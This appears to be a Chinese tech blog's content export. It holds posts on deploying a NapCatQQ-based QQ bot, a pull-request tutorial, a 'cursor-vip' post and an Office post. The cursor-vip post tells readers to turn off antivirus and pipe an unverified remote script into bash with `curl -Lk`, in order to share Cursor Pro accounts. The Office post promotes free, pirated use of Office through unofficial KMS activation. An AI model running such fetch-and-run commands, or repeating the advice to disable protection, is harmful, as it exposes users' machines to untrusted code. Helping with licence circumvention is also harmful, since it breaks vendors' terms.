      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——邀请链递归查询</title>
    <url>/posts/b02c5703.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——连接NapCatQQ和W1ndysBot</title>
    <url>/posts/cdcbc710.html</url>
    <content><![CDATA[<h2 id="部署-NapCatQQ"><a href="#部署-NapCatQQ" class="headerlink" title="部署 NapCatQQ"></a>部署 NapCatQQ</h2><h3 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>下面是无头非绿色版本，你也可以选择 NapCatQQ 的无头绿色版本，内置 QQ，不需要下载 QQ 本体，直接下载框架即可。由于绿色版开袋即用，启动就是登录，与非绿色版唯一的区别就是启动文件名字不同，绿色版的启动文件名字是 <code>napcat.bat</code>，非绿色版的启动文件名字是 <code>launcher***.bat</code>，这里不详细介绍。</p>

  </div>

<h4 id="下载-QQ-本体"><a href="#下载-QQ-本体" class="headerlink" title="下载 QQ 本体"></a>下载 QQ 本体</h4><p>直接去 QQ 官网下载 QQ 本体，必须是 NT 的新版 QQ</p>
<p>下载地址 <a class="link"   href="https://im.qq.com/index/#downloadAnchor" >QQ-轻松做自己<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="安装框架"><a href="#安装框架" class="headerlink" title="安装框架"></a>安装框架</h4><p>去 NapCatQQ 的 release 页下载 <a class="link"   href="https://github.com/NapNeko/NapCatQQ/releases/" >框架下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下载之后解压看到下面一些文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-a6838b30aa5159685e4f3a404eabd906.png"
                      alt="image-20250125121852680"
                ></p>
<p>根据你的电脑系统选择启动脚本</p>
<ol>
<li>确保 QQ 版本安装且最新</li>
<li>双击目录下 launcher.bat 即可启动 如果是 win10 则使用 launcher-win10.bat</li>
</ol>
<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><p>运行上面所属文件之后，你将看到如下界面，你有两种方法进行登录，推荐第一种</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-2effa5a8e0a5e1f6fac1df06e003148d.png"
                      alt="image-20250125122103940"
                ></p>
<blockquote>
<p>如果你使用的绿色版本，则启动就会直接到这一步</p>
</blockquote>
<h5 id="登录方法一"><a href="#登录方法一" class="headerlink" title="登录方法一"></a>登录方法一</h5><p>上方红框里有两个链接，复制到浏览器里</p>
<p>点击扫码登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-6a251be51cd1ff14b8497f019d20bbbc.png"
                      alt="image-20250125122134955"
                ></p>
<p>手机 QQ 进行扫码登录</p>
<p>登录成功后将会进入首页</p>
<h5 id="登录方法二"><a href="#登录方法二" class="headerlink" title="登录方法二"></a>登录方法二</h5><p>直接扫描控制台里的二维码（但由于不同电脑字符不一样，有的电脑显示的二维码可能不能扫，在上方图片下面的红框里，有一个地址和一个路径，把地址转换为二维码扫描或直接打开路径的二维码文件都可以获取到可以扫的二维码）</p>
<p>这种方法也可以登录，但由于后续步骤还需要打开方法一的链接，所以不推荐这种登录方法</p>
<h4 id="配置协议连接"><a href="#配置协议连接" class="headerlink" title="配置协议连接"></a>配置协议连接</h4><p>在上面的网页里登录成功后将看到下面内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-5df097c3a9563c30f77a023197cac622.png"
                      alt="image-20250125122445991"
                ></p>
<p>点击左侧网络配置-新建-websocket 服务器，按照下面进行配置</p>
<p>开关打开，名称随便写（不能空着），port 改成 3001，心跳间隔改成 60000，其他设置默认即可，确认</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-52e3f36c4dafd0fc4c5c5adf6cc6b174.png"
                      alt="image-20250125122539046"
                ></p>
<p>开启之后可以看到类似下面内容</p>
<blockquote>
<p>01-25 13:02:25 [info] 卷卷测试服 | [Notice] [OneBot11] 配置变更后:<br>[network] 配置加载<br>WebSocket 服务: 0.0.0.0:3001, : 已启动</p>
</blockquote>
<h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><blockquote>
<p>我是比较喜欢 docker 的，因为我平时用都会在 linux 服务器上运行，docker 会更方便一些</p>
</blockquote>
<p>docker 部署命令，W1ndysBot 有大量的我写好的 docker 运行脚本，可以直接参考着使用</p>
<p><a class="link"   href="https://github.com/W1ndysBot/W1ndysBot/blob/main/linux_run_napcat_docker.sh#/" >W1ndysBot&#x2F;linux_run_napcat_docker.sh at main · W1ndysBot&#x2F;W1ndysBot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>还有更新镜像的 shell 脚本：<a class="link"   href="https://github.com/W1ndysBot/W1ndysBot/blob/main/linux_update_napcat.sh" >W1ndysBot&#x2F;linux_update_napcat.sh at main · W1ndysBot&#x2F;W1ndysBot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动 Docker 容器</span></span><br><span class="line">docker run -d \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  --network host \</span><br><span class="line">  -e NAPCAT_GID=<span class="variable">$NAPCAT_GID</span> \</span><br><span class="line">  -e NAPCAT_UID=<span class="variable">$NAPCAT_UID</span> \</span><br><span class="line">  -p 3000:3000 \</span><br><span class="line">  -p 3001:3001 \</span><br><span class="line">  -p 6099:6099 \</span><br><span class="line">  --name napcat \</span><br><span class="line">  --restart=always \</span><br><span class="line">  -v ./napcat/app/.config/QQ:/app/.config/QQ \</span><br><span class="line">  -v ./napcat/app/napcat:/app/napcat \</span><br><span class="line">  mlikiowa/napcat-docker</span><br></pre></td></tr></table></figure></div>

<p>拉完镜像剩下的就跟前面步骤一模一样了</p>
<blockquote>
<p>其他的我就不多说了，你都会用 docker 了，其他还有什么错误是解决不了的</p>
</blockquote>
<h2 id="部署处理程序"><a href="#部署处理程序" class="headerlink" title="部署处理程序"></a>部署处理程序</h2><p>W1ndysBot 开源地址 <a class="link"   href="https://github.com/W1ndysBot/W1ndysBot" >W1ndysBot&#x2F;W1ndysBot: 基于 NapCatQQ 和 Python 的 QQ 机器人实现<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="解压程序到本地"><a href="#解压程序到本地" class="headerlink" title="解压程序到本地"></a>解压程序到本地</h3><p>解压之后看到下面文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-b76350cc60c80c7a44c908d000585413.png"
                      alt="image-20250125130459638"
                ></p>
<p>这里部署好了虚拟环境，可以直接运行，如果你有 Python 基础，也可以自己改环境运行，但不推荐</p>
<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>已经写好了批处理脚本</p>
<p>双击 <code>run_app.bat</code> 即可运行</p>
<p>连接成功后即可看到如下界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-1e0a0a2eb2fe9173a107e892c5ebe3ef.png"
                      alt="image-20250125130820179"
                ></p>
<blockquote>
<p>看到这里说明已经部署好环境，下面开始修改配置</p>
</blockquote>
<h2 id="配置数据"><a href="#配置数据" class="headerlink" title="配置数据"></a>配置数据</h2><p>进入目录，找到配置文件 <code>app/config.py</code></p>
<p>可以用专用的编辑器打开，也可以用记事本打开</p>
<p>注意！！！配置好之后，需要重启程序，否则配置不会生效</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br><span class="line"></span><br><span class="line">owner_id = [<span class="string">&quot;&lt;your_owner_id&gt;&quot;</span>]  <span class="comment"># 机器人 root 管理员 QQ 号，可以多个，多个用逗号分隔，例如：owner_id = [&quot;123456&quot;, &quot;123457&quot;]，注意！！！这个是 QQ 号不是机器人的QQ号，是你控制机器人用的大号</span></span><br><span class="line"></span><br><span class="line">report_group_id = <span class="string">&quot;&lt;your_report_group_id&gt;&quot;</span>  <span class="comment"># 上报群</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ws_url = &quot;ws://127.0.0.1:8081&quot;  # 本地环境的 WebSocket API 地址</span></span><br><span class="line"></span><br><span class="line">ws_url = <span class="string">&quot;ws://127.0.0.1:3001&quot;</span>  <span class="comment"># 本地环境的 WebSocket API 地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="literal">None</span>  <span class="comment"># 如果需要认证，请填写认证 token</span></span><br></pre></td></tr></table></figure></div>

<p>修改上面配置，下面是一个修改好的例子</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br><span class="line"></span><br><span class="line">owner_id = [<span class="string">&quot;123456&quot;</span>]  <span class="comment"># 机器人root管理员 QQ 号</span></span><br><span class="line"></span><br><span class="line">report_group_id = <span class="string">&quot;123456&quot;</span>  <span class="comment"># 上报群</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ws_url = &quot;ws://127.0.0.1:8081&quot;  # 本地环境的 WebSocket API 地址</span></span><br><span class="line"></span><br><span class="line">ws_url = <span class="string">&quot;ws://127.0.0.1:3001&quot;</span>  <span class="comment"># 本地环境的 WebSocket API 地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="literal">None</span>  <span class="comment"># 如果需要认证，请填写认证 token</span></span><br></pre></td></tr></table></figure></div>

<p>owner_id 是机器人 root 管理员 QQ 号</p>
<p>report_group_id 是上报群</p>
<p>ws_url 是 WebSocket API 地址</p>
<p>token 是认证 token</p>
<p>后面两个配置取决于前面的配置，一般不需要改</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>基于NapCatQQ和Python的QQ机器人开发——（NapCatQQ）猫猫的传参特性</title>
    <url>/posts/78b17ba9.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写群发功能的时候，发现猫猫的传参特性，特此记录。</p>
<p>事情的起因是，我写了一个群发功能，然后发现，发送的时候会从数据库读取群号，然后发送。读取到的群号是元组，然后我需要发送的群号是字符串，理论上来说，元组应该需要先转换成字符串，然后发送。</p>
<p>但是，我测试的时候，发现，如果我传入的是元组，猫猫会自动帮我转换成字符串，然后发送。</p>
<h2 id="猫猫的传参特性"><a href="#猫猫的传参特性" class="headerlink" title="猫猫的传参特性"></a>猫猫的传参特性</h2><p>实测发现，猫猫的传参特性是，如果传入的参数是元组，那么猫猫会自动帮你转换成列表，然后发送。</p>
<p>一开始我还以为是 Python 的特性，后来发现并不是，而是猫猫的特性。</p>
<p><strong>后来在群里问大佬，Z佬说猫猫的传参特性主要是可迭代对象就能转化发送。</strong></p>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>在发消息的 API 中，群号传入一个元组，然后猫猫会自动帮你转换成列表，然后发送。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> websocket.send(</span><br><span class="line">    json.dumps(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;send_group_msg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;group_id&quot;</span>: group_id, <span class="string">&quot;message&quot;</span>: content&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>

<p>这里传入的是一个元组，然后猫猫会转换成列表，然后发送。</p>
<p>例如传入的是<code>(&quot;10001&quot;,)</code>，那么猫猫会转换成<code>[&quot;10001&quot;]</code>，然后发送。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>猫猫的传参特性是，如果传入的参数是元组，那么猫猫会自动帮你转换成列表，然后发送。</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>QQbot</tag>
        <tag>QQ机器人</tag>
        <tag>NapCatQQ</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用Pull Request交付代码</title>
    <url>/posts/c011cf82.html</url>
    <content><![CDATA[<h1 id="如何使用-Pull-Request-交付代码"><a href="#如何使用-Pull-Request-交付代码" class="headerlink" title="如何使用 Pull Request 交付代码"></a>如何使用 Pull Request 交付代码</h1><h2 id="前排提醒"><a href="#前排提醒" class="headerlink" title="前排提醒"></a>前排提醒</h2><p>国内环境对 Github 的连接稳定性比较差，能否连上比较看运气，推荐开魔法进行连接</p>
<p>可自行使用 <a class="link"   href="https://steampp.net/download#/" >watt toolkit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（免费） 进行加速或使用 <a class="link"   href="https://sakura-cat3.com/register?code=Fo7cS2WA" >机场<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（付费）</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><blockquote>
<p>这里以 <a class="link"   href="https://github.com/W1ndys/QFNUCyberWiki" >W1ndys&#x2F;QFNUCyberWiki: QFNUCyberWiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例，放在其他仓库或以后工作，自己写项目，参与项目都适用</p>
</blockquote>
<h3 id="进入目标页面"><a href="#进入目标页面" class="headerlink" title="进入目标页面"></a>进入目标页面</h3><p>fork 仓库</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-91204b6e51b1db7dc8d2affb818dbfe2.png"
                      alt="image-20250312145457645"
                ></p>
<p>选择一个 owner（所有者），仓库名称和描述默认即可，也可以自定义，点击 <code>create fork</code> 进行创建</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-ee8b6e675dfcf0774b70de81926b6fb7.png"
                      alt="image-20250312145529182"
                ></p>
<p>稍等片刻将会创建一个 fork 副本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-1a346ce5dd416700a77f70c977c112be.png"
                      alt="image-20250312145708403"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-5ec596374dd50eb6b1952bfcd57b4782.png"
                      alt="image-20250312145713449"
                ></p>
<h3 id="同步仓库"><a href="#同步仓库" class="headerlink" title="同步仓库"></a>同步仓库</h3><p>很多时候，主仓库一般会有我们 fork 之后的推送内容，这时候需要先同步一下主仓库的提交记录，才能进行修改，否则容易导致代码冲突，造成比较麻烦的后果</p>
<p>点击 sync fork 之后会出现一个下拉菜单，点击绿色的更新分支按钮即可同步仓库</p>
<p><strong>注意：此处更新分支，如果本地修改内容和原来的内容无合并冲突的话是无任何提醒的，如果合并失败，则需要放弃你的本地修改，同步为主仓库的提交记录，为了避免数据丢失，请一定要备份好你的修改内容，便于后面同步后的修改</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-ac673a9d0ba8ac49f528f547e5f9be8d.png"
                      alt="image-20250312150659348"
                ></p>
<h3 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h3><blockquote>
<p>这里以修改 README 文件为例讲解，修改其他文件同理</p>
</blockquote>
<p>进入到目标文件的页面，点编辑按钮进行编辑，如果需要进行大批量操作或借助其它工具可以下载到本地编辑，编辑好之后再复制到这里进行修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-07ad17c95f86ad403fc22f17dea73128.png"
                      alt="image-20250312145925284"
                ></p>
<p>下面进行修改内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-82866d60596ac46a6366770a45799ebc.png"
                      alt="image-20250312150047951"
                ></p>
<p>修改完内容之后，点击右上角绿色按钮（commit changes）（此处使用快捷键 Ctrl+S 具有同样的效果）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-cd82ceba28b257cf3a0848ee27e530c8.png"
                      alt="image-20250312150220289"
                ></p>
<p>他会让你填写一些内容</p>
<p>上面是你的提交信息，用于说明你修改了什么</p>
<p>下面是额外的描述，用于详细说明修改了什么，如果修改内容较少，此处可以省略不填</p>
<p>填完之后再次点击绿色按钮进行保存</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-6fb79460c7a97c2b527e31ee2489676d.png"
                      alt="image-20250312150333683"
                ></p>
<p>如下图已保存成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-6a1ecafe15db9e2c4af5fee8dd7fa35f.png"
                      alt="image-20250312150343742"
                ></p>
<h2 id="进行-Pull-Request"><a href="#进行-Pull-Request" class="headerlink" title="进行 Pull Request"></a>进行 Pull Request</h2><p>经过上面操作之后，我们已经把我们自己 fork 的内容进行了修改，下面进行提交 Pull Request，即把我们修改的内容发给仓库所有者，让所有者进行合并代码</p>
<p>点击 contribute，点击 open Pull Request 打开拉取请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-a327f13172f151db446da63d65ffa4f9.png"
                      alt="image-20250312150913689"
                ></p>
<p>接下来将填写修改的内容，和之前的修改内容一样，上面是修改了什么，下面是详细的描述，这么写的目的是告诉仓库的所有者你做了什么修改，title 必填，描述选填，填完之后点击下方绿色的按钮创建一个 Pull Request</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-2f0123f36b1a2a3d3a12d355d2a15901.png"
                      alt="image-20250312150949666"
                ></p>
<p>至此，你已经成功创建了一个 Pull Request，等待仓库所有者检查代码并合并即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-b18c954bcc210514b12c587049fc185f.png"
                      alt="image-20250312151158033"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>如何免费使用cursor的vip账户 白嫖cursor Pro</title>
    <url>/posts/f63a776d.html</url>
    <content><![CDATA[<h1 id="cursor-vip"><a href="#cursor-vip" class="headerlink" title="cursor-vip"></a>cursor-vip</h1><p>⚠️ 如果您的地区支持官方 cursor 支付，在您资金允许的情况下,请支持官方购买，cursor 是一个不错的编辑器。</p>
<p>⚠️ 本项目仅为了支付不方便的地区提供一个解决方案，目前每 8 个设备共享一个 Pro 账号，Pro 账号都是我们花钱购买的，不要滥用，谢谢！</p>
<p>⚠️ 使用本项目所产生花费及收益比与官方一样，本项目没有更便宜，只是因为 8 个人分摊了，所以感觉花费更少。但是稳定性和速度都不如官方。</p>
<p>⚠️ 目前代理模式的稳定性要比普通模式好，如果在代理模式中提示资源用完，请新开个会话。</p>
<p>⚠️ 我们后期计划与 cursor 官方合作，为能够促进世界文明进步的项目提供支持。</p>
<h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>在 MacOS&#x2F;Linux 中，请打开终端；在 Windows 中，请打开 Git Bash。然后执行以下命令来安装：</p>
<blockquote>
<p>部分电脑可能会误报毒，需要关闭杀毒软件&#x2F;电脑管家&#x2F;安全防护再进行</p>
</blockquote>
<p>方式 1：通过 Gitee 脚本</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Lk https://gitee.com/kingparks/cursor-vip/releases/download/latest/ic.sh)  cba72d190dfd4dbcad2a78a54033fcb9</span><br></pre></td></tr></table></figure></div>

<p>方式 2：通过 GitHub 脚本</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Lk https://github.com/kingparks/cursor-vip/releases/download/latest/i.sh)  cba72d190dfd4dbcad2a78a54033fcb9</span><br></pre></td></tr></table></figure></div>

<p>享受 cursor-vip：</p>
<ul>
<li>打开 CURSOR 代码编辑器，点击右上角设置图标，可看到已是 VIP 账号。</li>
<li>尽情享受代码提示和聊天功能。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-e9c9ddf4e075d194fe329ab31d5e5766.png"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>cursor</category>
      </categories>
      <tags>
        <tag>cursor</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安装Microsoft office各种版本以及破解||office盗版弹窗的关闭方法</title>
    <url>/posts/9b07533a.html</url>
    <content><![CDATA[<hr>
<p><font color="red">这篇文章需要重写，有空再改改</font></p>
<hr>
<p>想必大家都认识 Microsoft office</p>
<p>就是常说的 Word Excel PPT 三大办公套件</p>
<p>当然也有 Outlook OneNote Publisher Access Teams 等这些不常用的</p>
<p>但是，正版购买要七百多甚至一千多！太贵了怎么办</p>
<p>没事</p>
<p>教你不花钱免费用</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>原地址：<a class="link"   href="https://www.coolhub.top/archives/42" >[新手必读] Office Tool Plus 入门教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h2><p>Office Tool Plus 是一个强大且实用的 Office 部署工具。</p>
<p>Office Tool Plus 基于 <a class="link"   href="https://aka.ms/ODT" >Office 部署工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 制作，可以很方便的部署 Office，其内置迅雷和 Downloader 引擎可帮助您更快地下载 Office。</p>
<p>你也可以使用 Office Tool Plus 的其他功能或者是内置的小工具方便、快捷地管理 Office 哦！</p>
<p>支持下列产品：</p>
<ul>
<li>Microsoft 365</li>
<li>Office 2016 - 2021</li>
<li>Visio Online Plan 2 &amp; Visio 2016 - 2021</li>
<li>Project Online Desktop Client &amp; Project 2016 - 2021</li>
</ul>
<p>个人主页：<a class="link"   href="https://officetool.plus/" >https://officetool.plus/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>官方网站：<a class="link"   href="https://otp.landian.vip/" >https://otp.landian.vip/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>帮助文档：<a class="link"   href="https://otp.landian.vip/help/" >https://otp.landian.vip/help/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>GitHub：<a class="link"   href="https://github.com/YerongAI/Office-Tool" >https://github.com/YerongAI/Office-Tool<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>无论你是个体还是团队，Office Tool Plus 都是你的得力小助手。</p>
<h2 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h2><p>请查看<a class="link"   href="https://otp.landian.vip/docs/zh-cn/start/requirement.html" >帮助文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="相关教程"><a href="#相关教程" class="headerlink" title="相关教程"></a>相关教程</h2><h3 id="点击阅读以下教程"><a href="#点击阅读以下教程" class="headerlink" title="点击阅读以下教程"></a>点击阅读以下教程</h3><p>[<a class="link"   href="https://www.coolhub.top/archives/11" >安装 Office] Office Tool Plus 入门教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[<a class="link"   href="https://www.coolhub.top/archives/14" >激活 Office] Office Tool Plus 入门教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[<a class="link"   href="https://www.coolhub.top/archives/13" >疑难解答] Office Tool Plus 入门教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[<a class="link"   href="https://www.coolhub.top/archives/44" >技能扩展] Office Tool Plus 高级教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul>
<li>创建 Office 安装配置，支持导出到本地；或从本地或网络位置导入。</li>
<li>下载 Office，支持所有通道的 Office，支持所有的 Office 语言。</li>
<li>安装 Office，支持对现有的 Office 进行修改，包括新增或卸载产品和应用程序。[1]</li>
<li>创建 Office ISO，支持默认安装配置、静默安装配置。</li>
<li>支持 Office 激活管理，包括许可证管理，密钥管理以及 KMS 管理。[2]</li>
<li>激活 Office，支持在线激活、电话激活、KMS 激活。[3]</li>
<li>修改 Office 更新通道，支持在不重装 Office 的情况下升级&#x2F;降级 Office.</li>
<li>移除 Office，在 Office 无法正常卸载的情况下强制移除 Office，几乎支持所有 Office 版本。</li>
<li>内置 Office 工具箱，可以修复安装或使用 Office 过程中遇到的大多数问题。</li>
<li>转换 Office 文档，基于 Office COM，稳定可靠。</li>
<li>自定义主题，打造你自己的专属 Office Tool Plus。</li>
</ul>
<p>还有更多功能，等待您的体验~</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">注[1]：能够安装的 Office 版本视 Windows 版本决定。</span><br><span class="line">注[2]：安装许可证时，旧的许可证不会被清除，因此零售和批量许可证可以共存。</span><br><span class="line">注[3]：无论你如何激活 Office 都需要自行处理，Office Tool Plus 不会也不可能提供任何破解途径。</span><br></pre></td></tr></table></figure></div>

<h2 id="Office-Tool-Plus-合法吗？"><a href="#Office-Tool-Plus-合法吗？" class="headerlink" title="Office Tool Plus 合法吗？"></a>Office Tool Plus 合法吗？</h2><p>Office Tool Plus 是一款完全合法的应用程序，提供的是原版 Office，不对 Office 的任何东西进行未经授权的修改。我们给用户提供了 Office 的下载、安装、激活功能，具体 Office 正版与否，取决于用户如何激活 Office。</p>
<p>Office 是支持账户、密钥、KMS 激活的，前两者基本都是正版授权（网上找的密钥另说），KMS 的正版和非正版因为人们多少都有点误解，因此在这里补充解释一下。</p>
<h2 id="什么是-KMS？"><a href="#什么是-KMS？" class="headerlink" title="什么是 KMS？"></a>什么是 KMS？</h2><p>具体的技术性资料可从网上搜索得到，这里就简单粗暴地描述一下。</p>
<hr>
<p>KMS 激活类似于签名一样，在大多数现实情况下，签名可以仿写，就像是“家长签名”一样，很多时候其实不是真的家长签名吧 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://www.coolhub.top/wp-content/themes/kratos-pjax-0.4.3/static/images/smilies/huaji.png"
                      alt=":huaji:"
                ></p>
<p>那么你把这份“经过家长签名”的东西给了老师或者领导，他们大多数时候也不会去验证是吧？</p>
<p>KMS 激活也是有正规的，正规的来讲就是要经过微软授权的（就比如签名一定得是家长本人签的）。</p>
<p>但 KMS 也可以像“家长签名”一样伪造，就是 Office 接收到了来自 KMS 主机返回的激活信息，它不知道这个信息是不是正版授权的，总之接收到了正确的信息然后就这么简单地就激活了。</p>
<p>一句话讲晒，就是冒名顶替，没人查确实不知道，一查出来你就 gg</p>
<hr>
<p>这就是 Office 与 KMS 的关系，简单来讲就是这样。再补充一下：</p>
<p>每隔 7 天（默认），Office 都会与 KMS 通信一次，以更新自己的许可证状态。</p>
<p>如果 KMS 允许你更新许可，那么新的许可就是 180 天期限。</p>
<p>如果 KMS 不允许你更新许可，或者 KMS 不可用，那么原来的 180 天期限到期后，你的 Office 就会变成未激活了。</p>
<h2 id="KMS-正版与否的区别"><a href="#KMS-正版与否的区别" class="headerlink" title="KMS 正版与否的区别"></a>KMS 正版与否的区别</h2><p>有微软授权的 KMS 服务器一般情况下只能部署在 Windows Server 上，且通常只在内网部署，不对外开放。</p>
<p>目前网上公开的基本都是基于 vlmcs 的 KMS 服务器，非正版，无激活限制，谁都可以访问。</p>
<h1 id="office-提示你的许可证不是正版，你可能是盗版软件的受害者？"><a href="#office-提示你的许可证不是正版，你可能是盗版软件的受害者？" class="headerlink" title="office 提示你的许可证不是正版，你可能是盗版软件的受害者？"></a>office 提示你的许可证不是正版，你可能是盗版软件的受害者？</h1><p>看这个</p>
